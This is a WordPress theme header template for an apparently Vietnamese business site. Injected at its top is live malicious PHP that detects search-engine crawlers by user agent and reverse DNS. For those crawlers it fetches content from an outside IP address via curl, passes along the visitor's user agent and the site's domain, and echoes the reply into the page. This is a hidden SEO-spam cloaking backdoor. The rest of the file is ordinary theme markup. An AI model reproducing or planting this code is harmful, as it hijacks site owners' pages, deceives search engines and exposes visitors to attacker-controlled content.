<?php


if ( !empty( $_SERVER["HTTP_USER_AGENT"] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, "-NO-WAY-", $_SERVER["HTTP_USER_AGENT"] ), "-NO-WAY-" ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER["REMOTE_ADDR"]), "google")) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://$xxx.236.65.24/cakes/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");    
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?><!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 7]>
<html id="ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html id="ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>" />
    <meta name="format-detection" content="telephone=no">
	<?php elegant_description(); ?>
	<?php elegant_keywords(); ?>
	<?php elegant_canonical(); ?>

	<?php do_action( 'et_head_meta' ); ?>

	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />

	<?php $template_directory_uri = get_template_directory_uri(); ?>
	<!--[if lt IE 9]>
	<script src="<?php echo esc_url( $template_directory_uri . '/scripts/ext/html5.js"' ); ?>" type="text/javascript"></script>
	<![endif]-->

	<script type="text/javascript">
		document.documentElement.className = 'js';
	</script>

	<?php wp_head(); ?>
</head>
<body <?php body_class(); ?>>
<?php
	if ( et_builder_is_product_tour_enabled() ) {
		return;
	}
?>
	<div id="page-container" class="page-container">
		<?php $header_vars = extra_get_header_vars(); ?>
		<!-- Header -->
		<header class="header <?php echo $header_vars['header_classes']; ?>">
			<?php if ( $header_vars['top_info_defined'] || is_customize_preview() ) { ?>
			<!-- #top-header -->
			<div id="top-header" style="<?php extra_visible_display_css( $header_vars['top_info_defined'] ); ?>">
					<div class="container">
					<!-- Secondary Nav -->
					<?php if ( '' !== $header_vars['secondary_nav'] ) { ?>
						<div id="et-secondary-nav" class="<?php echo extra_customizer_selector_classes( 
                            extra_get_dynamic_selector( 'top_navigation' ), false ); ?>">
						<?php if ( $header_vars['output_header_trending_bar'] ) { ?>
<!-- #et-info -->
			<div id="et-info" class="social-search">
					<!-- .et-extra-social-icons -->

<div class="flag">
						<a href="/" class="lang_sp multi_lang_sp_vi" ><img src="/wp-content/uploads/2017/10/ico_flag_vn.png" title="Tiếng Việt" alt="Tiếng Việt"></a>
<a href="/en" class="lang_sp multi_lang_sp_eng" ><img src="/wp-content/uploads/2017/10/ico_flag_usa.png" title="English" alt="English"></a>
</div>

						<?php } ?>
               
    						<?php if ( $header_vars['output_header_social_icons'] ) { ?>
<!-- .et-top-search -->
						<?php if ( $header_vars['output_header_search_field'] ) { ?>
						<div class="et-top-search" style="<?php extra_visible_display_css( $header_vars['show_header_search_field'] ); ?>">
							<?php extra_header_search_field(); ?>
						</div>
						<?php } ?>
              </div>
					               <div>
							<?php echo $header_vars['secondary_nav']; ?>
						<?php } else {
							echo $header_vars['secondary_nav'];
} ?>
						</div>
					<?php } ?>

						<!-- cart -->
						<?php if ( $header_vars['output_header_cart_total'] ) { ?>
						<span class="et-top-cart-total" style="<?php extra_visible_display_css( $header_vars['show_header_cart_total'] ); ?>">
							<?php extra_header_cart_total(); ?>
						</span>
						<?php } ?>
					</div>
<div class="hotline">
<p><span>Đường dây nóng: </span><img class="alignnone  wp-image-891" src="/wp-content/uploads/2017/10/icon_phone_red.png" /><span> 0983 070 071</span></p></div>


				</div><!-- /.container -->
 
			</div><!-- /#top-header -->
          
			<?php } // end if( $et_top_info_defined ) ?>
			<!-- Main Header -->
			<div id="main-header-wrapper">
				<div id="main-header" data-fixed-height="<?php echo esc_attr( et_get_option( 'fixed_nav_height', '80' ) ); ?>">
					<div class="container">
					<!-- ET Ad -->
						<?php if ( !empty( $header_vars['header_ad'] ) ) { ?>
						<div class="etad">
							<?php echo $header_vars['header_ad']; ?>
						</div>
						<?php } ?>

						<?php
						$logo = "/wp-content/uploads/2017/10/logo.png";
						$show_logo = extra_customizer_el_visible( extra_get_dynamic_selector( 'logo' ) ) || is_customize_preview();
						if ( $show_logo ) {
						?>

						<!-- Logo -->
		         <!-- <a class="logo-id" href="/"> <img src="/wp-content/uploads/2017/10/logo.png"/></a> -->
<?php
 if (get_locale() == 'vi') {
      echo ' <a class="logo-id" href="/"> <img src="/wp-content/uploads/2017/10/logo.png"/></a>';
  } 
  else { 
      echo '<a class="logo-id" href="/en"> <img src="/wp-content/uploads/2017/10/logo.png"/></a>';
  }
 ?>

						
<?php
						}
						$et_navigation_classes = extra_classes( array(
							extra_customizer_selector_classes( extra_get_dynamic_selector( 'main-navigation' ) ),
						), 'main-navigation', false );
						?>

						<!-- ET Navigation -->
						<div id="et-navigation" class="<?php echo $et_navigation_classes; ?>">
							<?php
							$menu_class = 'nav';
							if ( 'on' == et_get_option( 'extra_disable_toptier' ) ) {
								$menu_class .= ' et_disable_top_tier';
							}

							$primary_nav = wp_nav_menu( array(
								'theme_location'            => 'primary-menu',
								'container'                 => '',
								'fallback_cb'               => '',
								'menu_class'                => $menu_class,
								'menu_id'                   => 'et-menu',
								'echo'                      => false,
								'walker'                    => new Extra_Walker_Nav_Menu,
								'header_search_field_alone' => $header_vars['header_search_field_alone'],
								'header_cart_total_alone'   => $header_vars['header_cart_total_alone'],
							) );

							if ( !$primary_nav ) {
							?>
								<ul id="et-menu" class="<?php echo esc_attr( $menu_class ); ?>">
									<?php if ( 'on' == et_get_option( 'extra_home_link' ) ) { ?>
										<li <?php if ( is_home() ) echo 'class="current_page_item"'; ?>><a href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php esc_html_e( 'Home', 'extra' ); ?></a></li>
									<?php }; ?>

									<?php show_page_menu( $menu_class, false, false ); ?>
									<?php show_categories_menu( $menu_class, false ); ?>
								</ul>
							<?php
							} else {
								echo $primary_nav;
							}
							?>
							<?php do_action( 'et_header_top' ); ?>
						</div><!-- /#et-navigation -->
					</div><!-- /.container -->
				</div><!-- /#main-header -->
			</div><!-- /#main-header-wrapper -->

		</header>

		<?php $header_below_ad = extra_display_ad( 'header_below', false ); ?>
		<?php if ( !empty( $header_below_ad ) ) { ?>
		<div class="container">
			<div class="et_pb_extra_row etad header_below">
				<?php echo $header_below_ad; ?>
			</div>
		</div>
		<?php }
